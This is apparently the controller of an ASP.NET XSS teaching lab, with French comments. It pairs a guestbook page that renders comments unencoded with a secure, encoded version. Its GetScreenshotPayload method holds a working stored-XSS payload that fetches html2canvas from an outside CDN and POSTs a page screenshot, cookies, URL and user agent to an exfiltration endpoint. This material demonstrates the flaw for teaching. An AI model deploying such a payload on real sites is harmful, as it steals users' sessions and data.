using Microsoft.AspNetCore.Mvc;
using XssLabApp.Models;
using XssLabApp.Services;

namespace XssLabApp.Controllers;

public class GuestbookController : Controller
{
    private readonly CommentStore _store;

    public GuestbookController(CommentStore store)
    {
        _store = store;
    }

    // ================================================================
    // PAGE VULNERABLE - Affiche les commentaires SANS encodage (Html.Raw)
    // ================================================================
    public IActionResult Vulnerable()
    {
        var model = new GuestbookViewModel
        {
            Comments = _store.GetAll(),
            XssPayload = GetScreenshotPayload()
        };
        return View(model);
    }

    // ================================================================
    // PAGE SECURISEE - Affiche les commentaires avec encodage Razor par defaut
    // ================================================================
    public IActionResult Secure()
    {
        var model = new GuestbookViewModel
        {
            Comments = _store.GetAll()
        };
        return View(model);
    }

    // ================================================================
    // POST - Ajouter un commentaire (utilise par les deux pages)
    // ================================================================
    [HttpPost]
    public IActionResult AddComment(string author, string content, string returnTo)
    {
        if (!string.IsNullOrWhiteSpace(content))
        {
            _store.Add(new Comment
            {
                Author = string.IsNullOrWhiteSpace(author) ? "Anonyme" : author,
                Content = content,
                PostedAt = DateTime.Now
            });
        }

        return RedirectToAction(returnTo == "Secure" ? "Secure" : "Vulnerable");
    }

    // ================================================================
    // Reset les commentaires
    // ================================================================
    [HttpPost]
    public IActionResult Reset(string returnTo)
    {
        _store.Clear();
        return RedirectToAction(returnTo == "Secure" ? "Secure" : "Vulnerable");
    }

    private string GetScreenshotPayload()
    {
        var baseUrl = $"{Request.Scheme}://{Request.Host}";

        // Le payload doit :
        // 1. Avoir un garde (window._xssRan) pour ne s'executer qu'une seule fois
        // 2. Supprimer l'element <img> declencheur AVANT la capture html2canvas
        //    (sinon html2canvas re-clone le DOM, l'img echoue a nouveau, onerror re-fire => boucle infinie)
        return $@"<img src=x onerror=""if(window._xssRan)return;window._xssRan=true;this.remove();var s=document.createElement('script');s.src='https://html2canvas.hertzen.com/dist/html2canvas.min.js';s.onload=function(){{html2canvas(document.body).then(function(c){{fetch('{baseUrl}/api/exfiltration/capture',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:c.toDataURL(),url:window.location.href,cookies:document.cookie,userAgent:navigator.userAgent}})}}).then(function(){{console.log('Capture exfiltree')}})}})}};document.head.appendChild(s)"">";
    }
}
